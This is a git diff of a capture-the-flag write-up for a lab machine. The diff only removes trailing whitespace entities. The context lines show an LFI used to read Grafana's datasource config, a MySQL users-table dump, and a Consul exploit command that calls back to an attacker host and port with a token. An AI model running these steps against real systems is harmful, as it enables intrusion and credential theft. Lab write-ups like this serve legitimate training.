@@ -69,11 +69,11 @@ We can't edit it, and there wasn't any credentials in it:
 
 <figure><img src="../../../.gitbook/assets/image (2887).png" alt=""><figcaption></figcaption></figure>
 
-However, maybe we can use the LFI to read this file on the machine itself.&#x20;
+However, maybe we can use the LFI to read this file on the machine itself.
 
 {% embed url="https://grafana.com/docs/grafana/latest/administration/provisioning/" %}
 
-Based on this documentation, it is located in`/etc/grafana/provisioning/datasources`.&#x20;
+Based on this documentation, it is located in`/etc/grafana/provisioning/datasources`.
 
 <figure><img src="../../../.gitbook/assets/image (2008).png" alt=""><figcaption></figcaption></figure>
 
@@ -93,7 +93,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MySQL [(none)]>
 ```
 
-Then, we can use the `whackywidget` database to find the password for `developer`.&#x20;
+Then, we can use the `whackywidget` database to find the password for `developer`.
 
 ```
 MySQL [whackywidget]> select * from users\g
@@ -188,7 +188,7 @@ index 35c08f6..fc51ec0 100755
 +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
 ```
 
-Afterwards, just run the PoC above on the machine itself.&#x20;
+Afterwards, just run the PoC above on the machine itself.
 
 ```bash
 developer@ambassador:~$ python3 exploit_consul.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.13 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
